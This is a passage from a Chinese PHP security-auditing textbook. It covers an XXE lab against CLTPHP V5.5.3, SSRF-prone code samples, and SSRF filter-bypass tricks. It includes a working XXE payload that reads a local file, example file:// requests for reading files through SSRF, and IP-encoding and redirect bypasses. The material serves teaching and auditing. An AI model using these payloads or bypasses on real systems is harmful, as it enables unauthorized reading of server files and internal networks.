\u672C\u5B9E\u9A8C\u5C06\u5BF9CLTPHP V5.5.3\u7248\u672C\u8FDB\u884C\u4EE3\u7801\u5BA1\u8BA1\u5DE5\u4F5C\uFF0C\u5BA1\u8BA1\u8BE5CMS\u4E2D\u662F\u5426\u5B58\u5728XXE\u6F0F\u6D1E\u3002\r
\r
\xB7 \u9884\u5907\u77E5\u8BC6\r
\r
\u53C2\u80039.1\u8282\uFF1AXXE\u6F0F\u6D1E\u6316\u6398\uFF1B9.2\u8282\uFF1AXXE\u6F0F\u6D1E\u5206\u7C7B\u3002\r
\r
\xB7 \u5B9E\u9A8C\u76EE\u7684\r
\r
\u638C\u63E1XXE\u6F0F\u6D1E\u7684\u5BA1\u8BA1\u65B9\u6CD5\u3002\r
\r
\xB7 \u5B9E\u9A8C\u73AF\u5883\r
\r
Windows\u64CD\u4F5C\u7CFB\u7EDF\u4E3B\u673A\uFF1BCLTPHP V5.5.3\u5B89\u88C5\u5305\uFF1BPhpStorm\u5DE5\u5177\u3002\r
\r
\xB7 \u5B9E\u9A8C\u6B65\u9AA4\r
\r
\uFF081\uFF09  \u5BA1\u8BA1\u9636\u6BB5\r
\r
\u5BF9CLTPHP\u5168\u5C40\u641C\u7D22XXE\u6F0F\u6D1E\u7684\u5E38\u89C1\u51FD\u6570simplexml_load_string\uFF0C\u5982\u56FE9-1\u6240\u793A\u3002\u5BA1\u8BA1\u51FD\u6570simplexml_load_string\u7684\u53C2\u6570\u4F20\u9012\u8FC7\u7A0B\u5177\u4F53\u7684\u8FC7\u6EE4\u60C5\u51B5\u3002\u8BE5CMS\u4E2D\u6587\u4EF6app\\wchat\\controller\\Wchat.php\u7684\u7B2C111\u884C\u5B58\u5728unlink\u51FD\u6570\u3002\r
\r
![img](file:///C:/Users/ADMINI~1/AppData/Local/Temp/msohtmlclip1/01/clip_image464.jpg)\r
\r
\u56FE9-1 \u5168\u5C40\u641C\u7D22simplexml_load_string\u56FE\r
\r
\u5BF9Wchat.php\u6587\u4EF6\u7684getMessage\u51FD\u6570\u8FDB\u884C\u5BA1\u8BA1\uFF0C\u5176\u4EE3\u7801\u5982\u4E0B\uFF1A\r
\r
\r
\r
  public function getMessage()\r
\r
  {\r
\r
\u200B    **$from_xml = file_get_contents('php://input');//****\u5C06\u7528\u6237\u8F93\u5165\u8D4B\u503C\u7ED9\u53D8\u91CF$form_xml**\r
\r
\u200B    if (empty($from_xml)) {return;}//\u5224\u65AD$form_xml\u662F\u5426\u4E3A\u7A7A\r
\r
\u200B    $signature = input('msg_signature', '');\r
\r
\u200B    $signature = input('timestamp', '');\r
\r
\u200B    $nonce = input('nonce', '');\r
\r
\u200B    $url = 'http://' . $_SERVER['HTTP_HOST'] . $_SERVER['PHP_SELF'] . '?' . $_SERVER['QUERY_STRING'];\r
\r
\u200B    **$ticket_xml = $from_xml;//****\u5C06$form_xml\u53D8\u91CF\u8D4B\u503C\u7ED9\u53D8\u91CF$ticken_xml**\r
\r
\u200B    **$postObj = simplexml_load_string($ticket_xml, 'SimpleXMLElement', LIBXML_NOCDATA);        //****\u5C06$ticket_xml\u53D8\u91CF\u8F6C\u6362\u4E3A\u952E\u503C\u5BF9\u7C7B\u578B**\r
\r
\u200B    $this->instance_id = 0;\r
\r
\u200B    if (!empty(**$postObj->MsgType**)) { //\u5982\u679C$postObj->MsgType\u4E0D\u4E3A\u7A7A\r
\r
\u200B      switch (**$postObj->MsgType**) {\r
\r
\u200B        case "**text**":       //\u5982\u679C$postObj->MsgType\u4E3Atest\r
\r
\u200B          $resultStr = **$this->MsgTypeText($postObj);**\r
\r
\u200B          break;\r
\r
\u200B        case "**event**":      //\u5982\u679C$postObj->MsgType\u4E3Aevent\r
\r
\u200B          $resultStr = **$this->MsgTypeEvent($postObj);**\r
\r
\u200B          break;\r
\r
\u200B        default:\r
\r
\u200B          $resultStr = "";\r
\r
\u200B          break;}}\r
\r
\u200B    if (!empty($resultStr)) {echo $resultStr;//\u5982\u679C$resultStr\u4E0D\u4E3A\u7A7A\u5C06\u5176\u6253\u5370\r
\r
\u200B    } else {echo '';}//\u5426\u5219\u6253\u5370\u7A7A\u5B57\u7B26}\r
\r
\r
\r
\u4E0A\u8FF0\u4EE3\u7801\u6D41\u7A0B\uFF1A\r
\r
l \u5C06\u7528\u6237\u8F93\u5165\u7684\u5185\u5BB9\u8D4B\u503C\u7ED9$form_xml\u53D8\u91CF\u3002\r
\r
l \u8C03\u7528simplexml_load_string\u51FD\u6570\u5BF9$form_xml\u53D8\u91CF\u8F6C\u6362\u4E3A\u952E\u503C\u5BF9\uFF0C\u8D4B\u503C\u7ED9\u53D8\u91CF$postObj\u3002\r
\r
l \u6839\u636E$postObj->MsgType\u7684\u503C\u8C03\u7528MsgTypeEvent\u65B9\u6CD5\u8FDB\u884C\u5904\u7406\uFF0C\u5E76\u8D4B\u503C\u7ED9\u53D8\u91CF$resultStr\u3002\r
\r
l \u6253\u5370$resultStr\u53D8\u91CF\u503C\u524D\u53F0\u9875\u9762\u3002\r
\r
\u76EE\u524D\uFF0C\u53EF\u786E\u5B9A\u4E0A\u8FF0\u4EE3\u7801\u5B58\u5728XXE\u6F0F\u6D1E\u7684\u654F\u611F\u51FD\u6570simplexml_load_string\uFF0C\u540C\u65F6\u8BE5\u51FD\u6570\u8BE5\u51FD\u6570\u7684\u53C2\u6570$form_xml\u53EF\u63A7\u4E14\u672A\u7ECF\u8FC7\u8FC7\u6EE4\uFF0C\u56E0\u6B64\u5B58\u5728XXE\u6F0F\u6D1E\u3002\r
\r
\uFF082\uFF09\u6F0F\u6D1E\u5229\u7528\u5206\u6790\r
\r
\u867D\u7136\u5DF2\u7ECF\u5B58\u5728XXE\u6F0F\u6D1E\uFF0C\u4F46\u662FXXE\u6F0F\u6D1E\u7684Payload\u5E76\u4E0D\u786E\u5B9A\u3002\u8BE5CMS\u5C06\u7528\u6237\u8F93\u5165\u5185\u5BB9\u8C03\u7528MsgTypeEvent\u65B9\u6CD5\u5904\u7406\u8D4B\u503C\u7ED9$resultStr\uFF0C\u6700\u7EC8\u5C06\u8BE5\u53D8\u91CF\u6253\u5370\u3002\u800CMsgTypeEvent\u65B9\u6CD5\u4E2D\u53C8\u8C03\u7528event_key_text\u65B9\u6CD5\u5C06\u7528\u6237\u8F93\u5165$postObj\u8FDB\u884C\u5904\u7406\uFF0C\u4EE3\u7801\u5982\u4E0B\uFF1A\r
\r
\r
\r
public function event_key_text(**$postObj**, $content, $funcFlag = 0)\r
\r
{\r
\r
  if (! empty($content)) {\r
\r
\u200B    **$xmlTpl** = "<xml>\r
\r
\u200B            **<ToUserName><![CDATA[%s]]></ToUserName>**\r
\r
\u200B            **<FromUserName><![CDATA[%s]]></FromUserName>**\r
\r
\u200B            <CreateTime>%s</CreateTime>\r
\r
\u200B            <MsgType><![CDATA[text]]></MsgType>\r
\r
\u200B            <Content><![CDATA[%s]]></Content>\r
\r
\u200B            <FuncFlag>%d</FuncFlag>\r
\r
\u200B          </xml>";\r
\r
\u200B    **$resultStr =** sprintf(**$xmlTpl**, **$postObj->FromUserName, $postObj->ToUserName,** time(), $content, $funcFlag);\r
\r
\u200B    **return $resultStr;**\r
\r
  }else{\r
\r
\u200B    return '';\r
\r
  }}\r
\r
\r
\r
\u4E0A\u8FF0\u4EE3\u7801\u5C06\u7528\u6237\u8F93\u5165$postObj\u7684FromUserName\u5C5E\u6027\u548CToUserName\u5C5E\u6027\u4F20\u9012\u81F3\u53D8\u91CF$xmlTpl\u4E2D\uFF0C\u6700\u7EC8\u5C06\u5176\u8D4B\u503C\u7ED9$resultStr\u8FD4\u56DE\u81F3\u524D\u53F0\u5E76\u6253\u5370\u3002\u56E0\u6B64\uFF0C\u53EF\u4EE5\u6784\u9020Payload\u4E2D\u5305\u542BToUserName\u5C5E\u6027\u548CMsgType\u5C5E\u6027\u6CE8\u5165\u8BE5\u7A0B\u5E8F\u4E2D\u3002\u6784\u9020\u7684Payload\u5982\u4E0B\uFF1A\r
\r
\r
\r
<?xml version="1.0" encoding="utf-8"?> \r
\r
<!DOCTYPE **xxe** [<!ELEMENT name ANY ><!ENTITY xxe SYSTEM "file:///C:/windows/flag.txt" >]> \r
\r
<root>**<MsgType>text</MsgType>** \r
\r
**<ToUserName>&xxe;</ToUserName>**\r
\r
</root> \r
\r
\r
\r
\u81F3\u6B64\u7ED9\u51FA\u8BE5CMS\u7684XXE\u6F0F\u6D1E\u5229\u7528\u6D41\u7A0B\uFF0C\u5982\u56FE9-2\u6240\u793A\u3002\r
\r
![img](file:///C:/Users/ADMINI~1/AppData/Local/Temp/msohtmlclip1/01/clip_image466.jpg)\r
\r
\u56FE9-2 XXE\u6F0F\u6D1E\u5229\u7528\u94FE\u56FE\r
\r
\uFF083\uFF09\u6F0F\u6D1E\u6D4B\u8BD5\r
\r
\u53D1\u9001\u8BF7\u6C42http://127.0.0.1/cltphp/wchat/wchat/getMessage.html\uFF0C\u5C06\u6784\u9020\u7684Payload\u4F7F\u7528Post\u65B9\u6CD5\u53D1\u9001\u3002\u54CD\u5E94\u7684\u6570\u636E\u5305\u5982\u56FE9-3\u6240\u793A\uFF0C\u5176\u4E2DFromUserName\u5B57\u6BB5\u8BFB\u53D6\u4E86C:/windows/flag.txt\u6587\u4EF6\u7684\u5185\u5BB9\u5E76\u663E\u793A\u51FA\u6765\u3002\r
\r
![img](file:///C:/Users/ADMINI~1/AppData/Local/Temp/msohtmlclip1/01/clip_image468.jpg)\r
\r
\u56FE9-3 XXE\u6F0F\u6D1E\u54CD\u5E94\u6570\u636E\u5305\u56FE\r
\r
## 9.5 SSRF\u6F0F\u6D1E\u6316\u6398\r
\r
### 9.5.1 SSRF\u6F0F\u6D1E\u7B80\u4ECB\r
\r
SSRF\uFF08Server-Side Request Forger\uFF09\u6F0F\u6D1E\u540D\u4E3A\u670D\u52A1\u7AEF\u8BF7\u6C42\u4F2A\u9020\u3002\u653B\u51FB\u8005\u5229\u7528SSRF\u6F0F\u6D1E\u7531\u670D\u52A1\u5668\u7AEF\u53D1\u8D77\u4F2A\u9020\u8BF7\u6C42\uFF0C\u4ECE\u800C\u8BBF\u95EE\u5185\u90E8\u7F51\u7EDC\u6570\u636E\u5E76\u8FDB\u884C\u5185\u7F51\u4FE1\u606F\u63A2\u6D4B\u6216\u5185\u7F51\u6F0F\u6D1E\u5229\u7528\u3002\u4E00\u822C\u60C5\u51B5\u4E0B\uFF0CSSRF\u653B\u51FB\u7684\u76EE\u6807\u662F\u4ECE\u5916\u7F51\u65E0\u6CD5\u8BBF\u95EE\u7684\u5185\u90E8\u7CFB\u7EDF\u3002\u6B63\u56E0\u4E3A\u5B83\u662F\u7531\u670D\u52A1\u5668\u7AEF\u53D1\u8D77\u7684\uFF0C\u6240\u4EE5\u5B83\u80FD\u591F\u8BF7\u6C42\u5230\u4E0E\u5B83\u76F8\u8FDE\u800C\u4E0E\u5916\u7F51\u9694\u79BB\u7684\u5185\u90E8\u7CFB\u7EDF\u3002\r
\r
### 9.5.2 SSRF\u6F0F\u6D1E\u6316\u6398\u7ECF\u9A8C\r
\r
SSRF\u6F0F\u6D1E\u7684\u6316\u6398\u901A\u5E38\u5305\u62EC\u4E24\u79CD\uFF0C\u5206\u522B\u662F\u6839\u636E\u529F\u80FD\u6316\u6398\u3001\u6839\u636E\u51FD\u6570\u6316\u6398\u3001\u6839\u636EURL\u5173\u952E\u5B57\u6316\u6398\u6F0F\u6D1E\u3002\r
\r
1.\u6839\u636E\u529F\u80FD\u6316\u6398\r
\r
\u5728\u7F51\u7AD9\u5E94\u7528\u4E2D\uFF0CSSRF\u6F0F\u6D1E\u7ECF\u5E38\u51FA\u73B0\u7684\u529F\u80FD\u70B9\u5305\u62EC\uFF1A\u7F51\u9875\u5206\u4EAB\u3001\u5728\u7EBF\u8F6C\u7801\u3001\u5728\u7EBF\u7FFB\u8BD1\u3001\u56FE\u7247\u52A0\u8F7D\u7B49\u4E0E\u8BBF\u95EE\u8D44\u6E90\u76F8\u5173\u7684\u9875\u9762\u3002\u4E0B\u9762\u5BF9SSRF\u6F0F\u6D1E\u76F8\u5173\u7684\u529F\u80FD\u8FDB\u884C\u4ECB\u7ECD\uFF1A\r
\r
l \u901A\u8FC7URL\u5730\u5740\u5206\u4EAB\u7F51\u9875\u5185\u5BB9\r
\r
\u65E9\u671FWeb\u5E94\u7528\u7684\u5206\u4EAB\u529F\u80FD\u4E2D\uFF0C\u4E3A\u4E86\u66F4\u597D\u7684\u63D0\u4F9B\u7528\u6237\u4F53\u9A8C\uFF0CWeb\u5E94\u7528\u901A\u5E38\u4F1A\u83B7\u53D6\u76EE\u6807URL\u5730\u5740\u7F51\u9875\u5185\u5BB9\u4E2D\u7684<tilte></title>\u6807\u7B7E\u6216\u8005<meta name="description" content=\u201C\u201D/>\u6807\u7B7E\u4E2Dcontent\u7684\u6587\u672C\u5185\u5BB9\u4F5C\u4E3A\u663E\u793A\uFF0C\u4EE5\u63D0\u4F9B\u66F4\u597D\u7684\u7528\u6237\u4F53\u9A8C\u3002\u800C\u5982\u679C\u5728\u6B64\u529F\u80FD\u4E2D\u6CA1\u6709\u5BF9\u76EE\u6807\u5730\u5740\u7684\u8303\u56F4\u8FDB\u884C\u8FC7\u6EE4\u4E0E\u9650\u5236\uFF0C\u5219\u5C31\u5B58\u5728SSRF\u6F0F\u6D1E\u3002\r
\r
l \u5728\u7EBF\u8F6C\u7801\u670D\u52A1\r
\r
\u7531\u4E8E\u624B\u673A\u5C4F\u5E55\u5927\u5C0F\u7684\u5173\u7CFB\uFF0C\u76F4\u63A5\u6D4F\u89C8\u7F51\u9875\u5185\u5BB9\u7684\u65F6\u5019\u4F1A\u9020\u6210\u8BB8\u591A\u4E0D\u4FBF\uFF0C\u56E0\u6B64\u6709\u4E9B\u516C\u53F8\u63D0\u4F9B\u4E86\u8F6C\u7801\u529F\u80FD\uFF0C\u628A\u7F51\u9875\u5185\u5BB9\u901A\u8FC7\u76F8\u5173\u624B\u6BB5\u8F6C\u4E3A\u9002\u5408\u624B\u673A\u5C4F\u5E55\u6D4F\u89C8\u7684\u6837\u5F0F\u3002\u4F8B\u5982\u767E\u5EA6\u3001\u817E\u8BAF\u3001\u641C\u72D7\u7B49\u516C\u53F8\u90FD\u6709\u63D0\u4F9B\u5728\u7EBF\u8F6C\u7801\u670D\u52A1\u3002\u5728\u7EBF\u8F6C\u7801\u8BBF\u95EE\u7684\u5730\u5740\u672A\u8FDB\u884C\u8FC7\u6EE4\u5C06\u5BFC\u81F4SSRF\u6F0F\u6D1E\u3002\r
\r
l \u5728\u7EBF\u7FFB\u8BD1\r
\r
Web\u5E94\u7528\u4E2D\u901A\u8FC7URL\u5730\u5740\u7FFB\u8BD1\u5BF9\u5E94\u6587\u672C\u7684\u5185\u5BB9\uFF0C\u800CSSRF\u6F0F\u6D1E\u4E5F\u53EF\u5229\u7528\u8BE5URL\u5730\u5740\u8BBF\u95EE\u5185\u7F51\u8D44\u6E90\u3002\r
\r
l \u56FE\u7247\u52A0\u8F7D\u4E0E\u4E0B\u8F7D\r
\r
Web\u5E94\u7528\u901A\u8FC7URL\u5730\u5740\u52A0\u8F7D\u56FE\u7247\u5730\u5740\u3002\u4F8B\u5982\uFF1A\u5728\u6709\u4E9B\u516C\u53F8\u4E2D\u52A0\u8F7D\u5185\u7F51\u56FE\u7247\u670D\u52A1\u5668\u4E0A\u7684\u56FE\u7247\u7528\u4E8E\u5C55\u793A\u3002\u5F00\u53D1\u8005\u4E3A\u4E86\u66F4\u597D\u7684\u7528\u6237\u4F53\u9A8C\u901A\u5E38\u5BF9\u56FE\u7247\u505A\u4E9B\u5FAE\u5C0F\u8C03\u6574\uFF08\u52A0\u6C34\u5370\u3001\u538B\u7F29\u7B49\uFF09\uFF0C\u6240\u4EE5\u53EF\u80FD\u9020\u6210SSRF\u95EE\u9898\u3002\r
\r
l \u56FE\u7247\u3001\u6587\u7AE0\u6536\u85CF\u529F\u80FD\r
\r
\u6587\u7AE0\u6536\u85CF\u5C31\u7C7B\u4F3C\u4E8E\u529F\u80FD\u5206\u4EAB\u529F\u80FD\u4E2D\u83B7\u53D6URL\u5730\u5740\u4E2Dtitle\u4EE5\u53CA\u6587\u672C\u7684\u5185\u5BB9\u4F5C\u4E3A\u663E\u793A\uFF0C\u76EE\u7684\u8FD8\u662F\u4E3A\u4E86\u66F4\u597D\u7684\u7528\u6237\u4F53\u9A8C\uFF0C\u800C\u56FE\u7247\u6536\u85CF\u5C31\u7C7B\u4F3C\u4E8E\u56FE\u7247\u52A0\u8F7D\u5F15\u8D77\u7684SSRF\u6F0F\u6D1E\u3002\r
\r
l \u672A\u516C\u5F00\u7684api\u5B9E\u73B0\u53CA\u5176\u4ED6\u8C03\u7528URL\u7684\u529F\u80FD\r
\r
\u6B64\u7C7B\u4F3C\u529F\u80FD\u6709360\u63D0\u4F9B\u7684\u7F51\u7AD9\u8BC4\u5206\uFF0C\u4EE5\u53CA\u6709\u4E9B\u7F51\u7AD9\u901A\u8FC7api\u83B7\u53D6\u8FDC\u7A0B\u5730\u5740xml\u6587\u4EF6\u6765\u52A0\u8F7D\u5185\u5BB9\u5F15\u8D77\u7684SSRF\u6F0F\u6D1E\u3002\r
\r
2.\u6839\u636E\u51FD\u6570\u6316\u6398\r
\r
\u4E0B\u9762\u5BF9SSRF\u6F0F\u6D1E\u76F8\u5173\u7684\u51FD\u6570\u8FDB\u884C\u4ECB\u7ECD\uFF1A\r
\r
\u5168\u5C40\u641C\u7D22\u540E\u53F0\u4EE3\u7801\u4E2D\u7684\u5E38\u89C1\u51FD\u6570\uFF1Acurl_*()\u3001file_get_contents()\u3001fsocketopen()\u7B49\uFF0C\u67E5\u770B\u8FD9\u4E9B\u51FD\u6570\u4F20\u9012\u7684URL\u662F\u5426\u5B58\u5728\u8FC7\u6EE4\u60C5\u51B5\uFF0C\u82E5\u8FC7\u6EE4\u4E0D\u591F\u4E25\u683C\u5C06\u5B58\u5728SSRF\u6F0F\u6D1E\u3002\r
\r
3.\u6839\u636EURL\u5173\u952E\u5B57\u6316\u6398\r
\r
\u53EF\u901A\u8FC7\u5206\u6790\u8BF7\u6C42\u7684URL\u4E2D\u5173\u952E\u5B57\u5224\u65AD\u662F\u5426\u5B58\u5728SSRF\u6F0F\u6D1E\uFF0C\u5E38\u89C1\u7684\u5173\u952E\u5B57\u5305\u62EC\uFF1Ashare\u3001wap\u3001url\u3001link\u3001src\u3001source\u3001target\u3001u\u3001display\u3001imageUrl\u3001sourceURI\u3001domain\u7B49\u3002\r
\r
\u4F8B\u5982\u67D0\u7F51\u7AD9\u8C03\u7528\u5916\u90E8\u8D44\u6E90\u7684\u7F51\u5740\u4E3A\u201Chttp://widget.renren.com/*****?resourceUrl=https://www.sobug.com\u201D\uFF0C\u5982\u56FE9-4\u6240\u793A\u3002\r
\r
![img](file:///C:/Users/ADMINI~1/AppData/Local/Temp/msohtmlclip1/01/clip_image470.gif)\r
\r
\u56FE9-4 \u5916\u90E8\u8D44\u6E90\u8C03\u7528\u56FE\r
\r
## 9.6 SSRF\u6F0F\u6D1E\u5206\u7C7B\r
\r
\u6839\u636E\u4F7F\u7528\u51FD\u6570\u4E0D\u540C\uFF0C\u4E00\u822C\u5C06SSRF\u6F0F\u6D1E\u5206\u4E3A\uFF1ACURL\u5F15\u8D77\u7684SSRF\u3001file_get_contents\u5F15\u8D77\u7684SSRF\u3001fsocketopen\u5F15\u8D77\u7684SSRF\uFF0C\u672C\u5C0F\u8282\u5C06\u5BF9\u4E0A\u8FF0\u4E09\u79CD\u7C7B\u578B\u7684SSRF\u6F0F\u6D1E\u4EE3\u7801\u8FDB\u884C\u4ECB\u7ECD\u3002\r
\r
### 9.6.1 CURL\u5F15\u8D77\u7684SSRF\r
\r
1.\u5BA1\u8BA1\u6848\u4F8B\u4EE3\u7801\u5982\u4E0B\uFF1A\r
\r
\r
\r
<?php\r
\r
$url=$_GET['url'];\r
\r
$ch=curl_init($url); //\u6839\u636E\u53C2\u6570url\u521D\u59CB\u5316\u4E00\u4E2Aurl\u4F1A\u8BDD\uFF0C\u8FD4\u56DE\u4E00\u4E2ACURL\u53E5\u67C4\r
\r
curl_setopt($ch, CURLOPT_HEADER, 0); //\u8BBE\u7F6E\u53D1\u9001\u8BF7\u6C42\u7684HTTP\u5934\u6570\u7EC4\r
\r
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);\r
\r
// \u5C06curl_exec()\u83B7\u53D6\u7684\u4FE1\u606F\u4EE5\u6587\u4EF6\u6D41\u7684\u5F62\u5F0F\u8FD4\u56DE\uFF0C\u800C\u4E0D\u76F4\u63A5\u8F93\u51FA\r
\r
$result=curl_exec($ch);//\u6267\u884C\u8BF7\u6C42\r
\r
curl_close($ch);    //\u5173\u95ED\u8BF7\u6C42\r
\r
echo ($result);    //\u6253\u5370\u8BF7\u6C42\u7ED3\u679C\r
\r
?>\r
\r
\r
\r
2.\u5206\u6790\u6F0F\u6D1E\uFF1A\r
\r
\u4E0A\u8FF0\u4EE3\u7801\u4F7F\u7528curl_*\u51FD\u6570\u8FDB\u884C\u7F51\u7EDC\u6570\u636E\u8BBE\u7F6E\u5E76\u53D1\u9001\u8BF7\u6C42\uFF0C\u4F20\u9012HTTP\u7684\u8BF7\u6C42\u53C2\u6570url\u52A0\u8F7D\u7F51\u7EDC\u8D44\u6E90\u3002\u4F46\u7A0B\u5E8F\u5E76\u672A\u5BF9\u53C2\u6570url\u7684\u503C\u8FDB\u884C\u8FC7\u6EE4\uFF0C\u5BFC\u81F4\u653B\u51FB\u8005\u53EF\u901A\u8FC7\u8BE5\u53C2\u6570\u8BBF\u95EE\u5185\u7F51\u8D44\u6E90\uFF0C\u5F62\u6210SSRF\u6F0F\u6D1E\u3002\r
\r
\u7528\u6237\u53EF\u901A\u8FC7\u8F93\u5165\u8BF7\u6C42\uFF1A\u201Chttp://ip/code1.php?url=file://C:/Temp/flag.txt\u201D\u8BFB\u53D6\u6587\u4EF6\u5185\u5BB9\uFF0C\u6548\u679C\u5982\u56FE9-5\u6240\u793A\u3002\r
\r
![img](file:///C:/Users/ADMINI~1/AppData/Local/Temp/msohtmlclip1/01/clip_image472.jpg)\r
\r
\u56FE9-5 SSRF\u6F0F\u6D1E\u5229\u7528\u56FE1\r
\r
### 9.6.2 file_get_contents\u5F15\u8D77\u7684SSRF\r
\r
1.\u5BA1\u8BA1\u6848\u4F8B\u4EE3\u7801\u5982\u4E0B\uFF1A\r
\r
\r
\r
<?php\r
\r
$url = $_GET['url'];\r
\r
echo file_get_contents($url);\r
\r
?>\r
\r
\r
\r
2.\u5206\u6790\u6F0F\u6D1E\uFF1A\r
\r
file_get_contents\u8BE5\u51FD\u6570\u7528\u4E8E\u628A\u6587\u4EF6\u7684\u5185\u5BB9\u8BFB\u5165\u5230\u4E00\u4E2A\u5B57\u7B26\u4E32\u4E2D\u3002\u5F53\u8F93\u5165\u7684\u53C2\u6570\u4E3AURL\u65F6\uFF0C\u5C06\u8BBF\u95EE\u5BF9\u5E94\u7F51\u7AD9\u3002\u4F46\u8BE5\u51FD\u6570\u4E0D\u4EC5\u53EF\u4EE5\u8BBF\u95EE\u7F51\u9875\uFF0C\u540C\u65F6\u8FD8\u53EF\u4EE5\u8BBF\u95EE\u6587\u4EF6\u5185\u5BB9\u3002\u5F53\u7528\u6237\u8BBF\u95EE\u8F93\u5165\u8BF7\u6C42\uFF1A\u201Chttp://ip/code3.php?url= C:/Temp/flag.txt\u201D\u5373\u53EF\u8BFB\u53D6\u6587\u4EF6\u5185\u5BB9\uFF0C\u5982\u56FE9-6\u6240\u793A\u3002\r
\r
![img](file:///C:/Users/ADMINI~1/AppData/Local/Temp/msohtmlclip1/01/clip_image474.jpg)\r
\r
\u56FE9-6 SSRF\u6F0F\u6D1E\u5229\u7528\u56FE2\r
\r
### 9.6.3 fsocketopen\u9020\u6210\u7684SSRF\r
\r
1.\u5BA1\u8BA1\u6848\u4F8B\u4EE3\u7801\u5982\u4E0B\uFF1A\r
\r
\r
\r
<?php\r
\r
function Getfile($host, $port){\r
\r
  $fp = **fsockopen($host, intval($port), $errno, $errstr, 30);//** **fsockopen****\u7528\u4E8E\u6253\u5F00\u4E00\u4E2A\u7F51\u7EDC\u8FDE\u63A5\u6216\u8005\u4E00\u4E2AUnix \u5957\u63A5\u5B57\u8FDE\u63A5\uFF0C\u5B9E\u73B0\u5BF9\u7528\u6237\u6307\u5B9Aurl\u6570\u636E\u7684\u83B7\u53D6\u3002\u8BE5**\r
\r
**\u51FD\u6570\u4F1A\u4F7F\u7528socket\u8DDF\u670D\u52A1\u5668\u5EFA\u7ACBtcp\u8FDE\u63A5\uFF0C\u8FDB\u884C\u4F20\u8F93\u539F\u59CB\u6570\u636E\u3002**\r
\r
  if(!$fp){\r
\r
\u200B    echo "$errstr (error number $errno) \\n";\r
\r
  }else{\r
\r
\u200B    $out = "GET / HTTP/1.1\\r\\n"; //\u62FC\u63A5\u6253\u5370\u4FE1\u606F\r
\r
\u200B    $out .= "HOST $host \\r\\n";\r
\r
\u200B    $out .= "Connection: Close\\r\\n\\r\\n";\r
\r
\u200B    $out .= "\\r\\n";\r
\r
\u200B    fwrite($fp, $out); //\u5C06\u8FDE\u63A5\u4E0E\u4FE1\u606F\u6253\u5370\u503C\u9875\u9762\r
\r
\u200B    while(!feof($fp)){\r
\r
\u200B      $contents = fgets($fp, 1024);}\r
\r
\u200B    fclose($fp);\r
\r
\u200B    return $contents;}}\r
\r
\r
\r
2.\u5206\u6790\u6F0F\u6D1E\uFF1A\r
\r
fsockopen\u51FD\u6570\u7528\u4E8E\u6253\u5F00\u4E00\u4E2A\u7F51\u7EDC\u8FDE\u63A5\uFF0C\u5176\u53C2\u6570\u5305\u62EC\uFF1A\u4E3B\u673A\u540D\u3001\u7AEF\u53E3\u3001\u9519\u8BEF\u53F7\u3001\u9519\u8BEF\u5B57\u7B26\u4E32\u3001\u7B49\u5F85\u65F6\u95F4\u3002\u82E5\u7A0B\u5E8F\u4E2D\u5BF9\u4E3B\u673A\u540D\u53CA\u7AEF\u53E3\u53F7\u8FC7\u6EE4\u4E0D\u4E25\u683C\uFF0C\u5C06\u5BFC\u81F4SSRF\u6F0F\u6D1E\u7684\u4EA7\u751F\u3002\r
\r
## 9.7 SSRF\u6F0F\u6D1E\u7ED5\u8FC7\r
\r
  \u672C\u5C0F\u8282\u5C06\u7ED9\u51FASSRF\u6F0F\u6D1E\u7ED5\u8FC7\u7684\u65B9\u6CD5\uFF0C\u6B64\u65B9\u6CD5\u80FD\u591F\u5728\u4E00\u5B9A\u7A0B\u5EA6\u4E0A\u7ED5\u8FC7\u67D0\u4E9BCMS\u7684\u9632\u5FA1\u51FD\u6570\uFF0C\u5982\u4E0B\uFF1A\r
\r
\uFF081\uFF09\u5229\u7528\u89E3\u6790URL\u7ED5\u8FC7\r
\r
\u67D0\u4E9B\u60C5\u51B5\u4E0B\uFF0C\u540E\u7AEF\u7A0B\u5E8F\u53EF\u80FD\u4F1A\u5BF9\u8BBF\u95EE\u7684URL\u8FDB\u884C\u89E3\u6790\uFF0C\u5BF9\u89E3\u6790\u51FA\u6765\u7684host\u5730\u5740\u8FDB\u884C\u8FC7\u6EE4\uFF0C\u8FD9\u65F6\u53EF\u80FD\u4F1A\u51FA\u73B0\u5BF9URL\u53C2\u6570\u89E3\u6790\u4E0D\u5F53\uFF0C\u5BFC\u81F4\u53EF\u4EE5\u7ED5\u8FC7\u8FC7\u6EE4\u3002\r
\r
\u4F8B\u5982\uFF1A\u8BBF\u95EE http://www.test.com@10.10.10.10 \u4E0E\u8BBF\u95EE http://10.10.10.10 \u7684\u5185\u5BB9\u4E00\u81F4\u3002\r
\r
\uFF082\uFF09IP\u5730\u5740\u8F6C\u6362\u4E3A\u8FDB\u5236\u7ED5\u8FC7\r
\r
\u4E00\u4E9B\u5F00\u53D1\u8005\u4F1A\u901A\u8FC7\u5BF9\u4F20\u6765\u7684URL\u53C2\u6570\u8FDB\u884C\u6B63\u5219\u5339\u914D\u7684\u65B9\u5F0F\u6765\u8FC7\u6EE4\u5185\u7F51IP\uFF0C\u5BF9\u4E8E\u8FD9\u79CD\u8FC7\u6EE4\u53EF\u4EE5\u91C7\u7528IP\u5730\u5740\u8F6C\u6362\u7684\u65B9\u5F0F\u7ED5\u8FC7\u3002\r
\r
\u4F8B\u5982\uFF1A192.168.0.1\u5730\u5740\u53EF\u4EE5\u8F6C\u6362\u4E3A\uFF1A\r
\r
l 8\u8FDB\u5236\uFF1A0300.0250.0.1\r
\r
l 16\u8FDB\u5236\uFF1A0xC0.0xA8.0.1\r
\r
l 10\u8FDB\u5236\u6574\u6570\u683C\u5F0F\uFF1A3232235521\r
\r
l 16\u8FDB\u5236\u6574\u6570\u683C\u5F0F\uFF1A0xC0A80001\r
\r
\uFF083\uFF09  \u5229\u7528xp.io\u3001xp.name\u7ED5\u8FC7\r
\r
\u5F53\u7528\u6237\u8BBF\u95EE\u7F51\u5740\u7684\u5B50\u57DF\u540D\u65F6\uFF0C\u5982\uFF1A192.168.0.1.xip.io\u3002\u8BE5\u5730\u5740\u5C06\u81EA\u52A8\u91CD\u5B9A\u5411\u5230192.168.0.1\u3002\u56E0\u6B64\u53EF\u4EE5\u5229\u7528302\u8DF3\u8F6C\u7684\u65B9\u5F0F\u8FDB\u884C\u7ED5\u8FC7\u3002\uFF08\u5373\u5C06IP\u5730\u5740\u8BBE\u7F6E\u4E3AIP.xip.io\uFF09\u3002\r
\r
\uFF085\uFF09\u53E5\u53F7\u7ED5\u8FC7\u53CA\u7AEF\u53E3\u7ED5\u8FC7\r
\r
